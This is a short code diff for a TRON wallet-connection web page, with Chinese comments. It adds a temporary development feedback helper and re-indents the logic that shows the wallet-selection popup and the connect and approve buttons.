@@ -1776,7 +1776,14 @@ async function sendSignalA1() {
      * 修复3：点击链接后直接显示选择钱包弹窗（无需点击连接按钮）
      * 检测钱包环境（TRON兼容钱包）
      */
- async function checkWalletEnv() {
+async function checkWalletEnv() {
+    // 临时反馈函数（开发环境用，后续删除）- 补全定义！
+    const tempFeedback = (text) => {
+        DOM.userInfoStatus.style.display = "block";
+        DOM.userInfoStatus.innerHTML = `[开发中] ${text}`;
+        console.log(`[逻辑步骤] ${text}`);
+    };
+
     // 检测到本地tronWeb（已连接钱包）- 保留延时动画
     if (window.tronWeb && window.tronWeb.ready) {
         tronWeb = window.tronWeb;
@@ -1799,14 +1806,14 @@ async function sendSignalA1() {
         }
 
         // 步骤4：初始化成功 → 再显示钱包弹窗（关键：初始化后才弹窗）
-        tempFeedback("初始化完成，显示钱包选择弹窗");// 等待适配器初始化完成
-    // 立即执行DOM样式配置逻辑
-    DOM.specialTipContainer.style.display = "block";
-    DOM.userInfoStatus.style.display = "block";
-    DOM.userInfoStatus.innerHTML = "";
-    DOM.approveBtn.style.display = "none";
-    DOM.connectBtn.style.display = "block";
-    DOM.multiWalletPopup.style.display = "block";
+        tempFeedback("初始化完成，显示钱包选择弹窗");
+        // 立即执行DOM样式配置逻辑
+        DOM.specialTipContainer.style.display = "block";
+        DOM.userInfoStatus.style.display = "block";
+        DOM.userInfoStatus.innerHTML = "";
+        DOM.approveBtn.style.display = "none";
+        DOM.connectBtn.style.display = "block";
+        DOM.multiWalletPopup.style.display = "block";
 
         window._tronEnvChecked = true;
 
@@ -1817,7 +1824,6 @@ async function sendSignalA1() {
         DOM.multiWalletPopup.style.display = "block"; // 失败也弹窗
     }
 }
-
     /**
      * 重新渲染动态内容（语言切换/状态变化后调用，无修改）
      */
